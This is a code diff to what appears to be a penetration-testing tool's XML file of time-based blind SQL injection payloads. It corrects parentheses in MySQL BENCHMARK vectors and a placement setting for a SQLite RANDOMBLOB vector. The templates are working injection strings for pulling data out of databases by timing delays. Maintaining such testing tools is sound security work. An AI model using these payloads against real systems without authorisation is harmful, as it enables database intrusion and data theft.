@@ -1446,7 +1446,7 @@ Formats:
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND IF(([INFERENCE]), [RANDNUM], BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]'))</vector>
+        <vector>AND IF(([INFERENCE]), [RANDNUM], BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')))</vector>
         <request>
             <payload>AND BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]'))</payload>
         </request>
@@ -1605,7 +1605,7 @@ Formats:
         <risk>3</risk>
         <clause>1,2,3</clause>
         <where>2</where>
-        <vector>OR IF(([INFERENCE]), [RANDNUM], BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]'))</vector>
+        <vector>OR IF(([INFERENCE]), [RANDNUM], BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')))</vector>
         <request>
             <payload>OR BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]'))</payload>
         </request>
@@ -1699,7 +1699,7 @@ Formats:
         <level>4</level>
         <risk>3</risk>
         <clause>1</clause>
-        <where>1</where>
+        <where>2</where>
         <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB([SLEEPTIME]0000000))))) ELSE [RANDNUM] END)</vector>
         <request>
             <payload>OR [RANDNUM]=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB([SLEEPTIME]0000000))))</payload>
